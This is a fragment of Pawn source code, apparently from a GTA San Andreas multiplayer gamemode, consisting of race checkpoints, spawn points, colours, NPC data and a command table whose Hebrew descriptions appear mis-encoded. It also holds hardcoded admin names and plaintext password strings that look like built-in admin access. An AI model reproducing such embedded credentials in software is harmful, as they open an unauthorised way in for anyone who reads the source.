	{0,-1646.7341,1312.6395,7.0302,314.1025}, // spawn
	{1,-1636.0179,1315.4987,-0.5748,300.9986}, // cp
	{1,-1628.5291,1317.7931,-0.5803,273.7383}, // cp
	{1,-1619.2639,1316.5240,-0.5826,256.5048}, // cp
	{1,-1610.6295,1314.4521,-0.2777,256.5048}, // cp
	{1,-1601.3885,1313.3093,-0.7478,291.5984}, // cp
	{1,-1599.9236,1323.5769,-0.7478,3.0391}, // cp
	{1,-1606.1489,1328.6117,-4.2816,99.2334}, // cp
	{1,-1612.7904,1331.3470,-3.2720,67.5864}, // cp
	{1,-1619.1788,1334.2184,-2.7672,63.5131}, // cp
	{1,-1623.4321,1337.3792,-0.6646,33.1194}, // cp
	{1,-1627.0906,1344.6399,-0.5139,17.7660}, // cp
	{1,-1619.5481,1349.0295,-0.3736,300.0586}, // cp
	{1,-1604.4971,1348.6169,-4.6449,205.4309}, // cp
	{1,-1598.9808,1345.8409,-5.5370,247.4180}, // cp
	{1,-1590.7521,1343.4385,-6.1994,254.9381}, // cp
	{1,-1581.4098,1340.5454,-1.8497,252.1180}, // cp
	{1,-1574.7998,1338.3260,-0.5577,249.6114}, // cp
	{1,-1568.8533,1335.9061,-0.5820,63.1763}, // cp
	{1,-1562.0044,1334.8884,-6.7146,268.3882}, // cp
	{1,-1553.7581,1337.4021,-7.5180,293.7684}, // cp
	{1,-1547.4142,1344.3829,-6.7403,325.7288}, // cp
	{1,-1526.9124,1357.1858,-0.3504,319.4620}, // cp
	{1,-1518.5165,1364.9310,-0.3354,313.1953}, // cp
	{1,-1512.0398,1371.1576,3.0030,314.4486}, // cp
	{2,-1482.5209,1401.3926,-15.8837,0.1591}, // cp_down
	{2,-1478.5212,1422.6033,-36.6744,352.0125}, // cp_down
	{2,-1473.5989,1442.3475,-31.6398,346.0591}, // cp_down
	{2,-1464.0261,1473.2924,-31.6985,329.4522}, // cp_down
	{2,-1440.7046,1509.4904,-41.3220,352.6391}, // cp_down
	{2,-1432.4143,1554.3549,-49.0169,347.9391}, // cp_down
	{2,-1413.8458,1601.4733,-43.1430,339.1657}, // cp_down
	{2,-1411.8781,1629.4291,-42.5625,355.7725}, // cp_down
	{3,-1489.3049,1392.5322,1.1200,328.7450}, // cp_up
	{3,-1483.3147,1402.4010,1.1200,328.7450}, // cp_up
	{3,-1471.4812,1421.8986,1.1198,328.7450}, // cp_up
	{3,-1457.1542,1442.8940,1.1198,343.4718}, // cp_up
	{3,-1454.2091,1463.8369,1.1200,354.1253}, // cp_up
	{3,-1477.3203,1483.9226,1.1200,58.9858}, // cp_up
	{3,-1470.4065,1500.0513,1.1200,280.8045}, // cp_up
	{3,-1448.0481,1501.5072,1.7366,92.4894}, // cp_up
	{3,-1456.3154,1500.9586,6.9688,8.3060}, // cp_up
	{3,-1456.7538,1489.4202,7.1016,271.1951}, // cp_up
	{3,-1428.8644,1491.5239,7.1016,99.3652}, // cp_up
	{3,-1388.5000,1490.0162,7.1016,162.9724}, // cp_up
	{3,-1367.7305,1491.9485,11.0391,80.2619}, // cp_up
	{3,-1377.8245,1491.3389,11.2031,93.4221} // cp_up
};
new SRacePositions_3[][SRaceEnum] = // iron man
{
	{0,159.3658,-1819.8058,3.7486,269.5096},
	{0,159.4894,-1818.3192,3.7472,271.8154},
	{0,159.4894,-1816.5812,3.7455,269.3649},
	{0,159.6394,-1814.9224,3.7439,268.7944},
	{0,159.4052,-1813.5132,3.7425,268.9068},
	{0,157.3786,-1813.3921,3.7424,263.6363},
	{0,157.3287,-1815.2056,3.7441,267.7659},
	{0,157.2982,-1816.9376,3.7458,263.7487},
	{0,157.0921,-1818.8405,3.7477,264.7450},
	{0,157.2827,-1820.5693,3.7494,266.9945},
	{1,295.1021,-1798.5809,4.4514,282.1472},
	{1,345.3020,-1779.0770,4.8778,18.2658},
	{1,397.1793,-1783.8223,5.1554,251.7611},
	{1,423.0017,-1802.6238,5.1596,234.4099},
	{1,465.5094,-1825.6598,4.8351,249.8758},
	{1,524.8990,-1842.7045,4.5133,254.1179},
	{1,589.5656,-1861.0753,4.3902,254.0779},
	{1,623.3066,-1873.9158,4.0917,238.4773},
	{1,662.9567,-1889.2212,3.4348,250.2697},
	{2,717.5116,-1912.6113,4.9737,250.2792},
	{2,726.5115,-1854.1422,-0.5509,182.1753},
	{2,726.2264,-1840.4889,-0.6378,176.2219},
	{2,727.6445,-1822.0696,-0.6870,0.1269},
	{2,725.5310,-1813.7781,-0.4907,0.7536},
	{2,724.6483,-1718.6707,-0.3255,6.5384},
	{2,724.2190,-1625.7399,-0.3943,358.9082},
	{2,724.0219,-1510.1592,-0.3356,2.6454},
	{1,742.0864,-1483.9611,5.4757,273.9383},
	{1,745.6155,-1464.0728,8.9766,6.6858},
	{1,746.1246,-1441.1716,13.5391,342.0526},
	{1,699.0459,-1404.6428,13.2745,88.1822},
	{1,376.2928,-1503.5935,32.3138,128.7008},
	{1,328.8261,-1627.5436,33.0297,176.8705},
	{1,276.1698,-1634.8368,33.0424,82.6462},
	{1,286.0521,-1499.5692,32.5295,321.7806},
	{1,241.1542,-1497.7253,22.8245,129.1861},
	{1,187.8504,-1520.1279,12.3710,65.8369},
	{1,126.7119,-1589.4888,10.5224,141.0399},
	{1,112.2313,-1638.1172,9.9762,177.2485},
	{1,144.1269,-1735.7164,5.7535,258.8196},
	{1,150.2329,-1928.6984,3.6623,176.6064},
	{1,144.8577,-1947.6168,3.6643,158.8533},
	{1,152.2500,-1962.6884,3.6676,256.5326},
	{1,162.8721,-1945.4655,3.6641,14.0422}
};
new SRacePositions_4[][SRaceEnum] = // superman
{
	// type, x, y, z, a
	// type: 0=spawn 1=foot 2=swim/jetpack)
	{0,976.6111,2551.0505,10.5781,50.4534}, // supermanspawn
	{0,977.5171,2552.8320,10.5862,52.3896}, // supermanspawn
	{0,979.1743,2555.2922,10.5759,60.9059}, // supermanspawn
	{0,980.8940,2558.5037,10.6040,63.7821}, // supermanspawn
	{0,982.2961,2561.1782,10.6838,57.2582}, // supermanspawn
	{0,983.9528,2564.0374,10.7442,62.3278}, // supermanspawn
	{0,984.5948,2566.8945,10.6887,59.2507}, // supermanspawn
	{0,985.4878,2569.2625,10.6588,64.0069}, // supermanspawn
	{0,986.6964,2571.7100,10.6707,58.7364}, // supermanspawn
	{0,987.8640,2573.8330,10.6680,57.8526}, // supermanspawn
	{0,988.9716,2575.8274,10.6822,63.5489}, // supermanspawn
	{0,989.7895,2577.7131,10.7091,58.9050}, // supermanspawn
	{0,991.1530,2580.3291,10.7775,57.3946}, // supermanspawn
	{2,876.0803,2613.1377,20.7472,78.4098}, // supermancp
	{2,803.2133,2627.9824,33.2284,89.0077}, // supermancp
	{2,541.5121,2652.8086,70.8282,79.8758}, // supermancp
	{2,329.6645,2724.0171,93.4800,76.6914}, // supermancp
	{2,66.8494,2672.9912,80.9653,115.0895}, // supermancp
	{2,-219.3596,2661.2917,92.2514,82.1791}, // supermancp
	{2,-456.7519,2633.1335,107.1359,101.7342}, // supermancp
	{2,-659.3980,2589.1648,123.4226,100.0943}, // supermancp
	{2,-800.4141,2686.6655,106.8408,63.1325}, // supermancp
	{2,-1002.0068,2712.4753,48.8948,98.4646}, // supermancp
	{2,-1080.5997,2703.5271,48.5301,96.4407}, // supermancp
	{2,-1179.5754,2692.0012,49.3705,92.2511}, // supermancp
	{2,-1335.9546,2681.0391,51.0348,73.3983}, // supermancp
	{2,-1694.5667,2720.2864,86.0984,69.8757}, // supermancp
	{2,-1861.6346,2579.0510,75.0989,155.4935}, // supermancp
	{2,-1952.5906,2482.7322,44.3282,132.1816}, // supermancp
	{2,-2135.8281,2286.6174,28.1241,137.0759}, // supermancp
	{2,-2243.9731,2144.2078,-23.8079,157.6870}, // supermancp
	{2,-2299.6929,1997.3766,-23.6845,160.1922}, // supermancp
	{2,-2371.9421,1786.8568,-12.1891,164.2922}, // supermancp
	{2,-2391.4385,1661.9689,7.7042,172.7289}, // supermancp
	{2,-2401.7361,1553.9792,33.9202,174.4193}, // supermancp
	{2,-2477.5198,1541.8951,36.8047,82.8279} // supermancp
};
new adminnames[][MAX_PLAYER_NAME] =
{
	"[gmR]Amit",
	"(gmR)Amit",
	"(gmR)Amit[L]",
	"(gmR)Amit(L)",
	"(gmR)Amit(D)",
	"(gmR)Amit[TA]",
	"(gmR)Amit(TA)",
	"(gmR)XpOz",
	"Amitd_B",
	"TheAmaitB_",
	"TheAmfit_B_",
	"TheAmnitBE",
	"The_aAmitB",
	"TheAmit_B",
	"VAdM3_",
	"TesTesTerT3",
	"HeSoYaMye2",
	"KjKszpJa1",
	"UZUmYMw4",
	"ghJSht5",
	"ajio0Th6",
	"ah0ti09087",
	"Terahgsar8",
	"sethsrjBbn9",
	"shdiohy5387",
	"qscefbyMj",
	"y35t98qj",
	"MmeSgaS",
	"MsupSerS",
	"MsecuSrityS",
	"vl04ck94kc",
	"[SAMp)BOY",
	"kiIler_056e"
};
new adminpps[][64] =
{
	"123456798012345679801234564798012345679801234567980",
	"AMwT_bI",
	"qazwtsxedcrfvtgbyhnujmikOlp",
	"oj=-7p=o5a[p=-p-=v35qoq=064",
	"u93rh29r98324r9-i-io",
	"89w46h064hr.65geyg4g457",
	".320-8dfkd;al,",
	"ik3mgi0j40krf4k0f,94",
	"\"\"w04k09fr4f-kl-93i993999043094039",
	"i39ekap",
	"pXh",
	"o40l-f4=fl40-kf-04kf-l"
};
new luciferWeapons[] = {1,9,24,26,28,31,34,38,16,42,14,46};
new SecondAutoMessage[MAX_SAM][M_S], SAMs = 0;
new TDAutoMessage[MAX_TDAM][64], TDAMs = 0, Text:tdam;
new WelcomeMessages[MAX_WMSG][128], WMSGs = 0;
new Scrolls[][ScrollsEnum] =
{
	{"Double Kill (50%%)","ёщыхщщ 50%% рчхц ьурсь ф°щтф",10},
	{"Double Damage","ыхч ф·ўЇф юхыЇь Їщ 2",10},
	{"Auto Healing","ющьхщ чщщэ рхшхюшщ",10}
};
new Float:Kickstar[][4] =
{
	{-263.9980,1869.5922,41.8553,234.3040},
	{-254.0481,1875.9487,41.8552,332.8661},
	{-255.7169,1888.3082,41.8554,27.5878},
	{-249.6697,1897.5095,41.8552,293.1623},
	{-255.7095,1905.7705,41.8579,67.3874},
	{-264.2575,1905.4088,41.8593,103.2899},
	{-274.4509,1903.0027,41.8539,103.2977},
	{-286.6439,1900.1206,41.8553,103.2990},
	{-298.2935,1898.0782,41.8541,97.7317},
	{-316.7564,1894.9341,41.8586,95.9178},
	{-332.0386,1895.6207,41.8566,80.7565},
	{-346.0659,1893.4474,41.8579,114.5646},
	{-356.9742,1881.4010,41.8586,150.4576},
	{-359.0273,1867.4510,41.8564,186.4389},
	{-359.1079,1848.8007,41.8539,176.9764},
	{-355.0191,1825.1182,41.8564,202.0972},
	{-344.6560,1814.0854,41.8565,239.2873},
	{-329.4102,1812.5045,41.8553,274.9436},
	{-319.6698,1806.9648,41.9828,185.6094},
	{-310.2496,1805.3248,41.8615,287.8698},
	{-306.3340,1810.1714,41.8571,346.8863},
	{-302.7962,1819.5121,41.8560,335.0787},
	{-295.6102,1826.5406,41.8638,296.3629},
	{-291.7833,1832.8359,41.8562,349.9625},
	{-287.0417,1844.0957,41.8569,326.5869},
	{-278.4858,1849.0292,41.8584,270.0122},
	{-270.6162,1855.0671,41.8607,308.0939},
	{-262.5513,1861.3905,41.8543,308.0921},
	{-249.5746,1871.5627,41.8553,308.0920},
	{-244.0625,1880.8474,41.8553,333.7957},
	{-252.4603,1886.3619,41.8612,89.5541},
	{-259.5482,1878.4187,41.8568,121.1158},
	{-266.5324,1871.8059,41.8542,134.8543},
	{-275.8016,1865.1960,41.8578,121.6345},
	{-290.7639,1852.7031,41.8589,134.2072},
	{-301.6764,1840.4355,41.8552,140.5634},
	{-319.8827,1829.8859,41.8620,106.3482},
	{-335.7030,1828.0717,41.8578,83.6898},
	{-349.4161,1835.3694,41.8591,43.3229},
	{-350.4274,1851.3483,41.8582,324.9135},
	{-342.4449,1861.4550,41.8555,320.4637},
	{-338.1963,1877.1653,41.8622,12.4179},
	{-330.4361,1884.8511,41.8595,272.4261},
	{-321.7684,1883.0719,41.8561,248.6213},
	{-312.9702,1881.6991,41.8566,273.0733},
	{-301.8770,1884.3877,41.8542,286.9998},
	{-291.1172,1887.6769,41.8593,287.0011},
	{-277.0832,1887.6788,41.8571,256.7587},
	{-265.0674,1880.3951,41.8585,203.0435},
	{-269.3690,1872.9761,41.8596,103.0033},
	{-278.6534,1873.7991,41.8585,79.6902},
	{-289.9454,1869.9166,41.8581,125.4377},
	{-310.6656,1843.1034,41.8553,146.1161},
	{-313.7706,1824.3141,41.8579,197.0908},
	{-311.7670,1845.5769,41.8553,19.8873},
	{-314.6920,1853.6627,41.8583,19.8873},
	{-316.2576,1866.4564,41.8579,1.2996},
	{-320.9839,1882.6409,41.8553,26.5881},
	{-338.4432,1883.6722,41.8568,114.4696},
	{-342.1403,1849.7657,41.8603,236.8293},
	{-331.6471,1840.8483,41.8589,227.5770},
	{-318.5550,1835.4355,41.8563,270.0306},
	{-304.9299,1841.1826,41.8563,314.5062},
	{-299.8320,1858.6393,41.8548,2.7743},
	{-310.2128,1872.3228,41.8591,59.1681},
	{-317.4321,1882.6937,41.8567,10.2913},
	{-313.0410,1890.3199,41.8578,278.9927},
	{-300.4264,1891.3739,41.8538,273.2378},
	{-281.7569,1889.2985,41.8559,259.1560},
	{-264.4979,1893.9696,41.8552,308.0125},
	{-263.4874,1905.5941,41.8574,64.7925},
	{-275.7467,1900.8920,41.8553,156.2422},
	{-272.1725,1895.2766,41.8568,244.1858},
	{-262.7582,1885.7665,41.8557,211.2791},
	{-266.9001,1878.0892,41.8595,89.0816},
	{-280.7738,1876.8638,41.8619,104.2370},
	{-292.8371,1877.0482,41.8565,75.4415},
	{-302.7508,1874.3934,41.8549,140.4675},
	{-305.1312,1865.6965,41.8539,173.1321},
	{-311.6355,1859.3798,41.8560,112.4782},
	{-322.9503,1854.4321,42.0364,116.0171},
	{-340.8470,1858.7213,41.9500,32.0505},
	{-335.0390,1869.3501,42.0722,308.9966},
	{-323.5652,1869.2904,42.1006,228.8827},
	{-317.7440,1858.1444,41.8509,189.6097},
	{-316.3398,1839.0078,41.9267,192.0316},
	{-320.1984,1806.4385,42.0079,169.0438}
};
new VIP_WeaponDiscount[] = {0,10,20,30};
new Colors[][ColorEnum] =
{
	{"Red","рухэ",0xAA3333FF,"AA3333"}, {"Green","щ°хў",0x00FF00FF,"00FF00"}, {"Blue","ычхь",0x0000FFFF,"0000FF"},
	{"Brown","чхэ",0x993300FF,"993300"}, {"Grey","рЇх°",0xAFAFAFFF,"AFAFAF"}, {"Yellow","Ўфхс",0xFFFF00FF,"FFFF00"},
	{"Pink","х°ху",0xFF66FFFF,"FF66FF"}, {"LightBlue","ычхь сфщ°",0x33CCFFFF,"33CCFF"}, {"Orange","ы·хэ",0xFF9900FF,"FF9900"},
	{"Black","∙чх°",0x000000FF,"000000"}, {"Purple","ётхь",0x800080FF,"800080"}, {"DarkBlue","ычхь ыфф",0x2641FEAA,"2641FE"},
	{"LightRed","рухэ сфщ°",0xFF0000FF,"FF0000"}, {"LightGreen","щ°хў сфщ°",0x24FF0FFA,"24FF0F"}, {"Violet","х°ху2",0x9955DEFF,"9955DE"},
	{"SeaGreen","ычхь щэ",0x00EEADFF,"00EEAD"}, {"GrayWhite","рЇх° ься",0xEEEEFFFF,"EEEEFF"}, {"Indigo","рщЁущтх",0x4B00B0FF,"4B00B0"},
	{"White","ься",0xFFFFFFFF,"FFFFFF"}, {"Color","ЎсЄ",0xFFFFFFFF,"FFFFFF"}
};
new ColorLists[][ColorListsEnum] =
{
	{"Reds",{0xFF0000FF,0xFF3300FF,0xFF0033FF,0xFF3333FF,0xFF0066FF,0xFF3366FF,0xFF0099FF,0xFF3399FF,0xFF00CCFF}},
	{"Pinks",{0xFFCCFFFF,0xFFCCCCFF,0xFF99FFFF,0xFF99CCFF,0xFF66FFFF,0xFF66CCFF,0xFF33FFFF,0xFF33CCFF,0xFF00FFFF}},
	{"Purples",{0xCC99FFFF,0xCC66FFFF,0xCC66CCFF,0xCC33FFFF,0xCC33CCFF,0xCC00FFFF,0xCC00CCFF,0xCC3399FF,0xCC0099FF}},
	{"Greens",{0xCCFFCCFF,0xCCFF00FF,0x99FF66FF,0x99FF00FF,0x33FF99FF,0x33FF00FF,0x00FF99FF,0x00FF33FF,0x00FF00FF}},
	{"DarkGreens",{0x66CC66FF,0x66CC00FF,0x33CC66FF,0x33CC00FF,0x00CC66FF,0x00CC00FF,0x339966FF,0x009933FF,0x009900FF}},
	{"Oranges",{0xFFCC66FF,0xFFCC33FF,0xFFCC00FF,0xFF9966FF,0xFF9933FF,0xFF9900FF,0xFF6633FF,0xFF6600FF,0xFF3300FF}},
	{"Blues",{0x6666FFFF,0x6633FFFF,0x6600FFFF,0x3366FFFF,0x3333FFFF,0x3300FFFF,0x0066FFFF,0x0033FFFF,0x0000FFFF}}
};
new Float:Shooting[][7] =
{
	{1527.6193,-1364.6193,328.2182,124.2733,1346.6095,-1551.3402,85.5469}, // 1
	{-1753.0697,885.3673,295.8750,246.2031,-1487.8928,853.9459,26.6625}, // 2
	{-1267.6801,966.2692,133.0514,145.2670,-1327.5126,901.0269,46.8436}, // 3
	{1958.3719,1904.3953,130.9375,151.9515,1792.2750,1793.6001,26.7432}, // 4
	{1978.1301,1915.7788,130.9345,268.1177,2068.3223,1915.1686,34.5612}, // 5
	{1958.3970,1928.0820,130.9375,28.6796,1926.4097,2046.4753,10.8030}, // 6
	{2066.9241,2441.7793,165.6172,309.0947,2251.8396,2562.4714,19.8023} // 7
};
new Stunting[][StuntingEnum] =
{
	{{1839.7296,-1421.2898,13.1275,328.8902},	{0.0,0.0,0.0},					{1885.3135,-1330.5120,25.3331}}, // stunt1
	{{1970.7404,-1424.3301,13.5516,92.7155},	{0.0,0.0,0.0},					{1833.3728,-1414.5420,29.6172}}, // stunt2
	{{1930.1146,1450.6268,10.6719,269.7281},	{0.0,0.0,0.0},					{2094.9314,1483.2764,24.1406}}, // stunt3
	{{-2144.1372,322.9757,35.1641,269.4479},	{-1974.5042,322.4056,35.0717},	{-1859.7253,309.6806,39.4857}}, // stunt4
	{{-1627.8364,-364.7859,14.1484,88.8384},	{-1728.6743,-363.9976,17.1406},	{-1805.4546,-365.4562,18.9819}}, // stunt5
	{{1900.5836,887.1371,10.8203,270.3977},		{2057.0337,888.0142,7.8741},	{2106.9048,889.4520,15.6172}}, // stunt6
	{{2227.8157,1213.5808,10.8856,91.7150},		{2057.8396,1212.4272,11.1104},	{2014.2920,1211.0157,18.0859}}, // stunt7
	{{516.8580,-1784.6917,5.3273,67.2120},		{445.6400,-1757.8159,7.1241},	{424.1724,-1751.9821,14.6712}}, // stunt8
	{{1951.9698,887.6758,10.3850,90.3971},		{1796.5828,889.4965,9.7217},	{1775.1165,893.7595,26.8828}}, // stunt9
	{{1967.0775,-1424.7577,13.2759,89.3869},	{0.0,0.0,0.0},					{1834.3822,-1432.2507,35.9219}}, // stunt10
	{{1612.4248,-1230.5012,50.1326,354.6130},	{1623.2815,-1112.7764,60.8123},	{1613.0784,-1033.7140,52.5253}}, // stunt11
	{{-1068.8716,-937.1925,81.7152,41.9667},	{-1255.0413,-734.8801,63.7775},	{-1334.5201,-642.2748,27.0325}} // stunt12
};
new NPCs[][NPCsData] =
{   // file, name, vehicle, vseat, text, skin, veh model, xyza, veh colors, interior, world, param
	{"racer","DM_Racer",1,0,(Text3D:1024),255,451,{2097.7175,834.4070,6.4447,271.0308},{246,246},0,world_normal,np_none},
	{"pilot","DM_Pilot",1,0,(Text3D:1024),61,511,{1388.7698,1666.8741,12.1944,179.9533},{130,128},0,world_normal,np_none},
	{"bus","DM_Bus",1,0,(Text3D:1024),255,431,{1734.6570,1626.7157,9.2003,163.3937},{132,131},0,world_normal,np_none},
	{"shamal","DM_Plane",1,0,(Text3D:1024),61,519,{0.0,0.0,0.0,0.0},{-1,-1},0,world_normal,np_none},
	{"idle","DM_Bank",0,0,(Text3D:1024),147,0,{-23.3069,-57.6647,1003.5469,357.6211},{-1,-1},6,world_normal,np_none},
	{"idle","DM_Bank2",0,0,(Text3D:1024),147,0,{-142.8922,-126.4357,3.8047,178.7810},{-1,-1},6,world_bank,np_none},
	{"idle","DM_PhoneShop",0,0,(Text3D:1024),172,0,{-3318.9739,524.6640,1001.2109,266.3481},{-1,-1},0,world_normal,np_rob},
	{"idle","DM_BombShop",0,0,(Text3D:1024),179,0,{2570.9924,-2197.4797,-0.2188,4.7310},{-1,-1},0,world_normal,np_rob},
	{"idle","DM_PetShop",0,0,(Text3D:1024),11,0,{628.3780,-1972.3524,1.6259,269.1166},{-1,-1},0,world_normal,np_rob},
	{"idle","DM_GamblingGuy",0,0,(Text3D:1024),17,0,{1989.0217,1017.7040,994.8906,272.9418},{-1,-1},10,world_normal,np_none},
	{"idle","DM_GamblingGuy2",0,0,(Text3D:1024),17,0,{2235.4565,1671.3649,1008.3594,4.2184},{-1,-1},1,world_normal,np_none},
	{"idle","DM_Class1",0,0,(Text3D:-1024),0,0,{-2654.9919,-32.3120,6.1328,240.1433},{-1,-1},0,world_reqclass,np_reqclass},
	{"idle","DM_Class2",0,0,(Text3D:-1024),0,0,{-2654.6580,-29.5287,6.1328,240.1433},{-1,-1},0,world_reqclass,np_reqclass},
	{"idle","DM_Class3",0,0,(Text3D:-1024),0,0,{-2654.3540,-27.1093,6.1328,240.1433},{-1,-1},0,world_reqclass,np_reqclass},
	{"idle","DM_Class4",0,0,(Text3D:-1024),0,0,{-2641.4907,-31.3547,6.1328,139.8758},{-1,-1},0,world_reqclass,np_reqclass},
	{"idle","DM_Class5",0,0,(Text3D:-1024),0,0,{-2641.7991,-28.6667,6.1328,139.8758},{-1,-1},0,world_reqclass,np_reqclass},
	{"idle","DM_Class6",0,0,(Text3D:-1024),0,0,{-2641.7329,-26.1130,6.1328,139.8758},{-1,-1},0,world_reqclass,np_reqclass}
};
new BarItems[][BarData] =
{   // action, name, cash
	{SPECIAL_ACTION_DRINK_BEER,"Beer",25},
	{SPECIAL_ACTION_DRINK_WINE,"Wine",25},
	{SPECIAL_ACTION_SMOKE_CIGGY,"Cigar",10}
};
new Codes[][CodesEnum] =
{
	{"None",0,0,0,false},
	{"Money",0,100,25000,false},
	{"Bank Money",0,100,25000,false},
	{"Kills",0,-20,120,false},
	{"Weapons",0,0,0,false},
	{"Energy",0,-50,200,false},
	{"Tag Change",0,0,0,false},
	{"Level Name Change",0,0,0,false},
	{"Slap Access",0,1,5,false},
	{"Poke Access",0,1,10,false},
	{"Vehicle Speed",1,0,0,false},
	{"Vehicle Jump",2,0,0,false},
	{"Random Color",3,0,0,false},
	{"Water Walk",4,0,0,false},
	{"Anti Bike Fall",5,0,0,false},
	{"Gun Laser",6,0,0,false},
	{"Police Shield",7,0,0,false},
	{"Super Jump",8,0,0,false},
	{"Water Drive",9,0,0,true},
	{"Invisible Cars",10,0,0,true},
	{"Fireproof",11,0,0,true},
	{"Camera Distance",12,0,0,true}
};
new lcmds[][lcmdsEnum] =
{
	// cmd,			short,	short2,	lv, cl, mx, upcost,	money,	id, 	comp,	text
	{"/CBubble",	"",		"",		2,	0,	0,	0,		0,		0,		false,	"щЎщ°· шўёш юЄь °р∙ фуюх·"},
	{"/Lock",		"",		"",		2,	0,	0,	0,		0,		0,		true,	"ЁЄщь· °ыс"},
	{"/UnLock",		"",		"",		2,	0,	0,	0,		0,		0,		true,	"Ї·щч· °ыс юЁЄщьф"},
	{"/Kiss",		"",		"",		2,	0,	0,	0,		0,		0,		true,	"!Ё∙щўф"},
	{"/OutCar",		"",		"",		3,	0,	0,	0,		0,		0,		true,	"фхЎр· ∙чўя юф°ыс ∙ьъ"},
	{"/OutCarAll",	"",		"",		3,	0,	0,	0,		0,		0,		true,	"фхЎр· ыь ф∙чўЁщэ юф°ыс ∙ьъ"},
	{"/Me",			"",		"",		3,	0,	0,	0,		0,		0,		false,	"фЎт· фхуЄф юхут∙· с∙юъ сЎ'рш, ыхьь шўёш юЄь °р∙ фуюх·"},
	{"/Pee",		"",		"",		3,	0,	0,	0,		0,		0,		true,	"!·Ёёх ьсу"},
	{"/Flip",		"",		"",		4,	0,	0,	0,		0,		0,		true,	"фЇщы· ф°ыс"},
	{"/GMW",		"",		"",		4,	0,	0,	0,		0,		0,		true,	"фср· фЁ∙ўщэ ∙ьъ ь∙чўя рч°"},
	{"/HealMe",		"/Heal","/HM",	4,	1,	3,	8000,	0,		2,		true,	"°юф 1 - ющьхщ чщщэ\n°юф 2 - ющьхщ чщщэ, рэ фчщщэ юьрщэ щ·юьр фютя\n°юф 3 - ющьхщ чщщэ + ютя сщчу"},
	{"/Fix",		"/VR",	"",		5,	1,	2,	5000,	0,		5,		true,	"°юф 1 - ·щўхя ф°ыс ∙ьъ\n°юф 2 - ·щўхя ф°ыс ∙ьъ, ыхьь тьтьщэ / ыЁЇщ юшхё / Ёцўщэ рч°щэ"},
	{"/HealHim",	"/HH",	"",		5,	1,	3,	9000,	0,		3,		true,	"°юф 1 - ющьхщ чщщэ ь∙чўя рч° ў°хс юрху рьщъ\n°юф 2 - ющьхщ чщщэ, рэ фчщщэ юьрщэ щ·юьр фютя, ь∙чўя рч° ў°хс рьщъ\n°юф 3 - ющьхщ чщщэ + ютя сщчу ь∙чўя рч° ∙ўЎ· ў°хс рьщъ"},
	{"/Rob",		"",		"",		5,	1,	5,	8000,	0,		1,		true,	"∙ущу· ∙чўя (тЁщс· ыёє), ыь °юф ЁхёЇ· ∙ь фЇўхуф ·Єьф р· фыюх· фрЇ∙°щ· ьтЁщсф"},
	{"/HealUs",		"/HU",	"",		6,	1,	3,	10000,	0,		4,		true,	"°юф 1 - ющьхщ чщщэ ьыь ющ ∙ЁхтЄ съ\n°юф 2 - ющьхщ чщщэ, рэ фчщщэ юьрщэ щ·юьр фютя, ьыь ∙чўя ∙ЁхтЄ съ\n°юф 3 - ющьхщ чщщэ + ютя сщчу ьыь ф∙чўЁщэ ∙ў°хсщэ рьщъ"},
	{"/Hyd",		"",		"",		6,	0,	0,	0,		0,		0,		true,	"фхёЇ· фщу°хьщўф ь°ыс"},
	{"/Loc",		"/Pos",	"",		7,	1,	2,	6000,	0,		15,		true,	"рЇ∙°хщх· ∙ющ°· ющўхэ\nс°юф 2 фющўхэ Ё∙ю° тэ рч°щ ∙щхЎрщэ юф∙°·"},
	{"/VColor",		"/VC",	"",		7,	1,	3,	7500,	0,		6,		true,	"°юф 1 - ∙щЁхщ ЎсЄ ь°ыс\n°юф 2 - ∙щЁхщ ЎсЄ ь°ыс, ыхьь ЎсЄщэ ющхчущэ\n°юф 3 - ЎсЄщэ ю∙·Ёщэ ь°ыс"},
	{"/BooMe",		"/BMe",	"",		8,	1,	3,	13000,	0,		7,		true,	"щЎщ°· ЇщЎхї юёсщсъ, ∙ьр ЇхтЄ съ"},
	{"/Boom",		"/BM",	"",		8,	1,	3,	11000,	0,		8,		true,	"°юф 1 - щЎщ°· ЇщЎхї сюўхэ сх р·ф Єхюу\n°юф 2 - ЇщЎхї чцў щх·°\n°юф 3 - °Єщу· юёъ сщчу Єэ фЇщЎхї"},
	{"/PPill",		"",		"",		9,	0,	0,	0,		0,		0,		true,	"(∙щЁхщ юфщ°х· фю∙чў (Єхц° сў°сх·"},
	{"/SetFire",	"",		"",		9,	1,	2,	12000,	700,	9,		true,	"°юф 1 - щ°щў· р∙\n°юф 2 - щ°щў· р∙ тухьф"},
	{"/BigBang",	"",		"",		10,	1,	2,	12000,	700,	10,		true,	"°юф 1 - щЎщ°· 12 ЇщЎхЎщэ ўшЁщэ юёсщсъ + ющьхщ чщщэ\n°юф 2 - щЎщ°· 24 ЇщЎхЎщэ ўшЁщэ юёсщсъ + ющьхщ чщщэ"},
	{"/Flix",		"",		"",		10,	1,	2,	8000,	0,		16,		true,	"!·щўхя хфЇщы· ф°ыс сЇўхуф рч·\nс°юф 2, ·щўхя юьр ∙ь ф°ыс"},
	{"/Nitro",		"",		"",		11,	1,	3, 	6000,	0,		11,		true,	"фхёЇ· Ёщш°х ь°ыс, сыь °юф ∙ь фЇўхуф фЁщш°х щх·° шхс"},
	{"/Cuff",		"",		"",		11,	0,	0,	0,		250,	0,		true,	"фхёЇ· рцщўщэ ь∙чўя"},
	{"/Twist",		"",		"",		12,	0,	0,	0,		0,		0,		true,	"ю∙чў ютЁщс Єэ ф°ыс"},
	{"/Jumping",	"",		"",		12,	1,	5,	3000,	0,		17,		true,	"ўЇщЎф ўущюф\nыыь ∙ф°юф ю∙·Ї°·, фўЇщЎф щх·° ью°чў"},
	//{"/Melee",		"",		"",		13,	1,	3,	20000,	0,			false,	18,	"ўсь· Ё∙ў ьЇтщЄф юў°хс\nсыь °юф, Єху Ё∙ўщэ"},
	//{"/Gun",		"",		"",		13,	1,	7,	20000,	0,		19,		false,	"ўсь· Ё∙ў ьЇтщЄф ю°чхс\nсыь °юф, ёхт чу∙ ∙ь Ё∙ўщэ"},
	{"/Invisible",	"/Vis",	"",		14,	1,	3,	10000,	0,		12,		true,	"фЇщыф ьсь·щ Ё°рф сюЇ· фю∙чў\nс°юф 1-2 ·хЎт сўх∙щ (с∙ўщЇх· тсхфф юрху), с°юф 3 ьр ·хЎт сыьь"},
	{"/Turbo",		"",		"",		14,	0,	0,	0,		250,	0,		true,	"!сухюф ьрЇўш ∙ь чЁх· ф∙щЇх°щэ фющхчущэ ь°ыс, ссщЎхЄ фЇўхуф ·хЇЄь юфщ°х· шх°сх"},
